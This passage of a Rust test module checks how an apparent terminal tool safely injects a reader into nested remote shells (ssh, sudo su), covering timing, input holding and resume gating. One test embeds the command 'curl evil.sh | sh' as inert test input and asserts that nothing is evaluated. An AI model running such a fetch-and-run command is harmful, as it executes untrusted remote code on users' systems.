    /// reader and the payload): the reader stops at the foreign line, reads
    /// no more, and evaluates NOTHING — the old reader evaluated the shifted
    /// lines, the user's line among them.
    #[test]
    fn a_desynced_stream_evaluates_nothing() {
        let mut inj = bootstrap::nested_injection("cafebabe12345678");
        inj.erase_row = Some(3);
        let mut stream = format!("{}\rcurl evil.sh | sh\r", inj.reader);
        for l in inj.payload_lines() {
            stream.push_str(&l);
            stream.push('\r');
        }
        let (read, body, left) = remote_reads(&stream);
        assert_eq!(read, vec!["curl evil.sh | sh".to_string()], "one read, then stop");
        assert_eq!(body, "", "nothing may be evaluated");
        // What is left runs at the prompt: our four lines, each an inert
        // ` #`-led comment.
        for l in left.split('\r').filter(|l| !l.is_empty()) {
            assert!(l.starts_with(" #p"), "{l:?} would run as a command");
        }
    }

    /// The H3 analogue (rig-reproduced at 600ms RTT: `cat > notes` written
    /// Pulse's reader and its 7KB payload into the user's file). A line the
    /// user submits at the nested prompt leaves the OLD prompt on screen for
    /// a whole round trip; nothing on the screen is evidence until the shell
    /// has answered.
    #[test]
    fn a_submit_at_the_nested_prompt_waits_for_the_shells_answer() {
        let ms = Duration::from_millis;
        let t0 = Instant::now();
        let mut e = armed(t0);
        // The nested prompt painted and settled.
        e.on_growth(300, t0 + ms(100));
        // The user submits `cat > notes` at 400ms; the journal is at 300.
        assert_eq!(
            e.route_input(b"cat > notes\r", true, Some(300), t0 + ms(400)),
            InputRoute::DeliverAwaitAnswer
        );
        let pending = |e: &NestHook| matches!(e.phase, Phase::AwaitQuiet { answer_from: Some(_), .. });
        assert!(pending(&e));
        // 1s RTT: at 1.2s the screen is still the quiet old prompt (800ms of
        // silence since the submit). It must not be read as a place to type.
        let Phase::AwaitQuiet { armed: armed_at, last_change, answer_from, .. } = e.phase else {
            unreachable!()
        };
        let at = t0 + ms(1200);
        assert_eq!(
            open_action(at - armed_at, at - last_change, false, false, false, true, answer_from.is_some()),
            OpenAction::Wait,
            "the reader must not be typed before the shell answered the user's line"
        );
        // ...nor may the reader be typed by a decision already in flight.
        assert_eq!(e.clone().begin_reader(300, 300, at), None);
        // The echo of the user's line arrives: the shell answered. From here
        // the ordinary settle rules judge the screen it painted.
        e.on_growth(330, t0 + ms(1400));
        assert!(!pending(&e));
        // Growth that is not past the submit point does not count.
        let mut early = armed(t0);
        early.route_input(b"cat\r", true, Some(300), t0 + ms(400));
        early.on_growth(300, t0 + ms(450));
        assert!(pending(&early), "only output after the submit is an answer");
    }

    /// The reader is typed only on the screen the pump judged: output since
    /// the decision, or an unanswered submit, refuses it.
    #[test]
    fn the_reader_is_typed_only_on_the_screen_that_was_judged() {
        let t0 = Instant::now();
        assert_eq!(armed(t0).begin_reader(100, 101, t0), None, "output arrived since");
        let mut e = armed(t0);
        assert!(e.begin_reader(100, 100, t0).is_some());
        assert_eq!(e.begin_reader(100, 100, t0), None, "never twice");
    }

    /// The hold is bounded: past `HOLD_CAP` the payload goes now and the
    /// held bytes follow it — nothing is ever dropped.
    #[test]
    fn a_huge_paste_during_the_reads_flushes_rather_than_drops() {
        let t0 = Instant::now();
        let mut e = in_reads(t0);
        let chunk = vec![b'a'; HOLD_CAP / 2];
        assert_eq!(e.route_input(&chunk, false, None, t0), InputRoute::Hold);
        assert_eq!(e.route_input(&chunk, false, None, t0), InputRoute::Hold);
        assert_eq!(e.route_input(b"b", false, None, t0), InputRoute::FlushThenDeliver);
        let (_, held) = e.take_payload(None, t0).expect("payload");
        assert_eq!(held.len(), HOLD_CAP, "everything held so far follows the payload");
        assert_eq!(e.take_payload(None, t0), None, "the payload goes out once");
    }

    /// The resume-sequencing contract: `reestablish` may only type the
    /// inner-CLI resume when the nested world is hooked or hookless — never
    /// while an injection is still in flight.
    #[test]
    fn nest_state_gates_the_resume() {
        assert_eq!(NestState::Absent, NestState::Absent);
        assert_ne!(NestState::Pending, NestState::Hooked);
        assert!(reestablish::resume_may_send(NestState::Absent));
        assert!(reestablish::resume_may_send(NestState::Hooked));
        assert!(
            !reestablish::resume_may_send(NestState::Pending),
            "an in-flight injection must park the resume"
        );
        // typed-ssh-nested: the same predicate now gates the NEXT CHAIN STEP
        // too (`Phase::AwaitStepHooked`). Typed remote shells are the first
        // common multi-step chain (`ssh <host>` then `sudo su`), and typing
        // step 2 mid-injection put the reader line in the WRONG shell — the
        // innermost world hooked but labelled depth 1, the shell in between
        // left unhooked. Both edges must read the identical rule, which is
        // what sharing this function guarantees.
        for nest in [NestState::Absent, NestState::Pending, NestState::Hooked] {
            assert_eq!(
                reestablish::resume_may_send(nest),
                nest != NestState::Pending,
                "the step edge and the resume edge must agree for {nest:?}"
            );
        }
    }
}
